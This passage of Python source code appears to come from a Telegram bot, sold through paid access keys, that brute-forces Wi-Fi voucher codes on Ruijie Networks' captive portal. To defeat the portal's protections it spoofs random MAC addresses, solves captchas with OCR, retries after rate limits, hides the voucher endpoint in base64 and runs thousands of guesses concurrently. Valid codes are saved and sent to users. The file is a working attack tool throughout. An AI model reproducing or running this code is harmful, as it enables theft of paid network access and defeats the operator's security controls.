🔗 `/input <session_url>` - Set your session URL

🔍 `/scan <mode>` - Start scanning for voucher codes
   Modes: `6`, `7`, `8`, `ascii-lower`, `all`

📋 `/result` - Show your previously found codes

🔄 `/recheck` - Recheck your saved codes

⏹ `/stop` - Stop the current scan

❓ `/help` - Show this help message

━━━━━━━━━━━━━━━━━━━━━━
📌 **How It Works**
━━━━━━━━━━━━━━━━━━━━━━

1. Get authorized by the admin (@mgzan201)
2. Use `/input` with your session URL
3. Use `/scan` to start finding codes
4. Found codes auto-save to `/result`
5. Use `/recheck` to verify old codes
"""
        else:
            help_text = """
❌ **You are not authorized to use this bot!**

Please contact the admin to get access:
👤 Admin: @mgzan201
"""
        await bot.edit_message_text(
            help_text,
            chat_id=chat_id,
            message_id=message_id,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("◀️ Back", callback_data="menu_main")
            )
        )
        await call.answer()

    # ─── Admin Menu ──────────────────────────────────────────────────────
    elif call.data.startswith("admin_"):
        if str(chat_id) != ADMIN_ID:
            await call.answer("❌ No Permission", show_alert=True)
            return
        if call.data == "admin_status":
            active_scans = sum(
                1 for data in scan_tasks.values()
                if not data["task"].done()
            )
            uptime_seconds = int(time.monotonic() - _start_time)
            hours, remainder = divmod(uptime_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            await bot.edit_message_text(
                f"📊 **Bot Status**\n\n"
                f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
                f"🔍 Active Scans: {active_scans}\n"
                f"👥 Authorized Users: {len(authorized_users)}\n"
                f"👥 Sessions Loaded: {len(user_data)}",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=admin_menu()
            )
        elif call.data == "admin_listkeys":
            try:
                auth_list, _ = await get_file_content("auth_list.json")
                if not auth_list:
                    await bot.edit_message_text(
                        "📭 No registered keys yet.",
                        chat_id=chat_id,
                        message_id=message_id,
                        reply_markup=admin_menu()
                    )
                else:
                    lines = []
                    for uid, data in auth_list.items():
                        if isinstance(data, dict):
                            expires = data.get("expires_at", "unknown")
                            plan = data.get("plan", "unknown")
                            if expires == "9999-12-31T23:59:59Z":
                                expires_str = "♾️ Unlimited"
                            else:
                                try:
                                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                                    now = datetime.now(timezone.utc)
                                    if exp_dt < now:
                                        expires_str = "⏰ Expired"
                                    else:
                                        diff = exp_dt - now
                                        days = diff.days
                                        hours, rem = divmod(diff.seconds, 3600)
                                        minutes = rem // 60
                                        expires_str = f"{days}d {hours}h {minutes}m left"
                                except:
                                    expires_str = expires
                        else:
                            plan = "old"
                            expires_str = str(data)
                        lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
                    text = f"📋 **Registered Keys** ({len(auth_list)})\n\n" + "\n\n".join(lines)
                    if len(text) > 4096:
                        await bot.send_message(chat_id, "📋 Keys list too long, check console.")
                        print(text)
                    else:
                        await bot.edit_message_text(
                            text,
                            chat_id=chat_id,
                            message_id=message_id,
                            parse_mode="Markdown",
                            reply_markup=admin_menu()
                        )
            except Exception as e:
                print(f"Error at listkeys {e}")
        elif call.data == "admin_genkey":
            await bot.edit_message_text(
                "🔑 **Generate Key**\n\n"
                "Type: `/genkey <plan> <user_id>`\n\n"
                "**Plans:** `30m`, `1h`, `1d`, `7d`, `1m`, `1y`, `unlimited`\n"
                "**Example:** `/genkey 7d 123456789`",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=admin_menu()
            )
        elif call.data == "admin_delkey":
            await bot.edit_message_text(
                "🗑 **Delete Key**\n\n"
                "Type: `/delkey <user_id>`\n\n"
                "**Example:** `/delkey 123456789`",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=admin_menu()
            )
        elif call.data == "admin_users":
            auth_list, _ = await get_file_content("authorized_users.json")
            github_users = auth_list.get("users", []) if auth_list else []
            
            lines = ["👥 **Authorized Users**\n"]
            lines.append(f"Total: `{len(github_users)}` users\n")
            
            for uid in github_users:
                is_admin = "👑 Admin" if uid == int(ADMIN_ID) else "✅ User"
                lines.append(f"• `{uid}` - {is_admin}")
            
            text = "\n".join(lines)
            await bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
                reply_markup=admin_menu()
            )
        await call.answer()

# ─── Helper Functions ──────────────────────────────────────────────────────
async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            text_ = str(response.url)
            print(text_)
            if "sessionId" in text_:
                return True
            else:
                return False
    except:
        return False

# ─── Code Generation ──────────────────────────────────────────────────────
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍 **Scanning Codes...**\n\n"
            f"📦 Checked: `{checked:,}/{total:,}`\n"
            f"📊 Progress: `{percent:.2f}%`\n"
            f"⚡ Speed: `{speed_str}`\n"
            f"`[{bar}]`"
        )
    return (
        f"🔍 **Scanning Codes...**\n\n"
        f"📦 Checked: `{checked:,}`\n"
        f"⚡ Speed: `{speed_str}`\n"
        f"📊 Status: `running`\n"
    )

BATCH_SIZE = 1000

# ─── Captcha Cache ────────────────────────────────────────────────────────
def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

# ─── Run Brute Force ──────────────────────────────────────────────────────
async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message
                    )

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text,
                    parse_mode="Markdown"
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text, parse_mode="Markdown")
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            finish_text = (
                "✅ **Scanning Completed!**\n\n"
                f"📦 Checked: `{checked:,}`\n"
                "📊 Progress: `100%`\n"
                "`[████████████████████]`"
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text,
                    parse_mode="Markdown"
                )
            except:
                try:
                    await bot.send_message(chat_id, finish_text, parse_mode="Markdown")
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)

# ─── MAC Address ──────────────────────────────────────────────────────────
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

# ─── Get Session ID ──────────────────────────────────────────────────────
async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return previous_session_id
    except:
        print("Session ID Fetch Error")
        return previous_session_id

# ─── Perform Check ──────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []

        success_texts[chat_id].append(code)
        code_line = "\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code
        })
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"✅ **Success Codes:**\n\n```\n{code_line}\n```",
                        parse_mode="Markdown"
                    )
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=success_messages[chat_id],
                            text=f"✅ **Success Codes:**\n\n```\n{code_line}\n```",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"✅ **Success Codes:**\n\n```\n{code_line}\n```",
                                parse_mode="Markdown"
                            )
                            success_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Success Fallback Error: {err}")
            except Exception as e:
                print(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        limited_line = "\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"⚠️ **Limited Codes:**\n\n```\n{limited_line}\n```",
                        parse_mode="Markdown"
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"⚠️ **Limited Codes:**\n\n```\n{limited_line}\n```",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"⚠️ **Limited Codes:**\n\n```\n{limited_line}\n```",
                                parse_mode="Markdown"
                            )
                            limited_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Limited Fallback Error: {err}")
            except Exception as e:
                print(f"Limited Message Error: {e}")

# ─── OCR ──────────────────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None

# ─── GitHub Update Scheduler ─────────────────────────────────────────────
async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content(
                    "result.json",
                    results,
                    sha,
                    "Periodic Update"
                )
            except Exception as e:
                print(f"Update Error: {e}")

# ─── Bot Polling ──────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ─── Main ──────────────────────────────────────────────────────────────────
async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=2000,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    try:
        # GitHub ကနေ authorized users စာရင်းကိုယူမယ်
        await load_authorized_users()
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
